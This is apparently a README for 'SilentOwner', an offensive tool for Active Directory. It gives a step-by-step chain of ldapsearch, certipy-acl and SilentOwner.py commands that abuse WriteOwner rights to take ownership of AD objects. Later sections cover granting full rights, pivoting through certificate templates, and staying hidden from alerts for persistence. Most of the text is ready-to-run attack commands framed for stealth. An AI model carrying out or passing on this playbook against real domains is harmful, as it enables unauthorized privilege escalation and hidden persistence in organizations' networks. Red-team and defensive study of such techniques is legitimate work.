# 🧩 USAGE STRATEGY — SilentOwner

This guide explains how to **maximize the power of SilentOwner** by chaining it with stealth LDAP enumeration tools like `certipy-acl`.

> 🧬 Goal: Use **WriteOwner** to quietly take over AD objects — and pave the way to **persistence** or **privilege escalation** — all without triggering alerts.

---

## 1. 🔓 Step One — Low-Privileged LDAP Bind

Start with any domain account — no admin needed.

```bash
ldapsearch -H ldap://<DC_IP> \
  -D 'user@domain.local' \
  -w 'password' \
  -b "DC=domain,DC=local" \
  "(objectClass=user)" sAMAccountName objectSid
```

This gives you:
- Usernames and their SIDs
- Group objects (optional)
- The **Domain SID**, which all object SIDs will share

---

## 2. 🔎 Step Two — Run `certipy-acl`

Use your account with `certipy-acl` to discover where you have **WriteOwner**.

```bash
python3 -m certipy_tool \
  -u 'user@domain.local' \
  -p 'password' \
  -target domain.local \
  -dc-ip <DC_IP> \
  --filter-sid <YOUR_SID> \
  --resolve-sids
```

✅ Look for output like:

```text
[ACL] CN=SomeGroup,...
  [ACE] Type: ACCESS_ALLOWED, Mask: 0x80000, SID: <your SID>
    [+] WriteOwner
```

---

## 3. 🧬 Step Three — Run SilentOwner

Now you know:
- The object DN you can take over
- Your own SID

Use `SilentOwner.py` to **replace the OwnerSID** without modifying ACEs.

```bash
python3 SilentOwner.py \
  --dc-ip <DC_IP> \
  -u 'user@domain.local' \
  -p 'password' \
  --domain domain.local \
  --target-dn 'CN=TargetGroup,CN=Users,DC=domain,DC=local' \
  --new-owner-sid '<YOUR_SID>'
```

SilentOwner will:
- Pull the `nTSecurityDescriptor`
- Replace only the `OwnerSID`
- Write it back via `ldap.modify()`

---

## 4. 🧱 Step Four — Post-Takeover

After becoming owner, **you can grant yourself full rights** using another tool:

### Option A: Inject ACE with `inject_ace.py`
Inject `GenericAll` or `WriteDACL` to the object's DACL (planned future feature)

### Option B: Abuse Ownership for AD CS
If the object is a group with **Enroll** rights over a Certificate Template:
- Add yourself to the group
- Request cert → authenticate → pivot

---

## 🔁 Recap Flow

```
🧠 LDAP SID extraction
   │
   └───▶ 🎯 certipy-acl → find WriteOwner over object
           │
           └───▶ 🧬 SilentOwner → set yourself as new owner
                     │
                     └───▶ 🧱 Inject ACEs or abuse group privileges
```

---

## 🔒 Stay Stealthy

✅ SilentOwner modifies **only** the OwnerSID, using `SDFlags=0x01`  
✅ No ACE injection, no shell, no PowerShell, no beacon  
✅ Ideal for red teamers and stealthy persistence setup

---

📚 Created by [xploitnik](https://github.com/xploitnik)  
Contributions welcome — feel free to submit new strategy flows, tools, or scripts!


